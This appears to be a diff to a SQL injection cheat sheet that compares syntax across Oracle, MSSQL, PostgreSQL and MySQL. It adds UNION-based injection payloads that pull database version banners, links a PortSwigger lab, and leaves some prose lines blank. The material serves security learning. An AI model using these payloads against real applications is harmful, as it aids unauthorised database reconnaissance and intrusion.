@@ -81,15 +81,15 @@
 | `'foo'\|\|'bar'`<br>=> `foobar` | `'foo'+'bar'`<br>=> `foobar` | `'foo'\|\|'bar'`<br>=> `foobar` | `'foo' 'bar'`<br>`CONCAT('foo','bar')`<br>=> `foobar` | Concatenate strings |
 | `SUBSTR('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | `SUBSTRING('foobar', 4, 2)`<br>=> `ba` | Extract part of a string. |
 | --comment | --comment<br>/\*comment\*/ | --comment<br>/\*comment\*/ | \#comment<br>-- comment <br>[Note the space after the double dash]<br>/\*comment\*/ | Comments to truncate a query. |
-| `SELECT banner FROM v$version`<br> |  |  |  | Database Version |
+| `x' UNION SELECT banner FROM v$version--`<br>`x' UNION SELECT version, NULL FROM v$instance--`<br> | `x' UNION SELECT @@version, NULL--` | `x' UNION SELECT version(), NULL--` | `x' UNION SELECT @@version, NULL-- ` | Database Version extraction  via UNION injection with two columns. [See this labs](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle). |
 
 
 You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.
 Oracle 	
-SELECT version FROM v$instance
-Microsoft 	SELECT @@version
+
+Microsoft 	
 PostgreSQL 	SELECT version()
-MySQL 	SELECT @@version
+MySQL 	
 Database contents
 
 You can list the tables that exist in the database, and the columns that those tables contain.
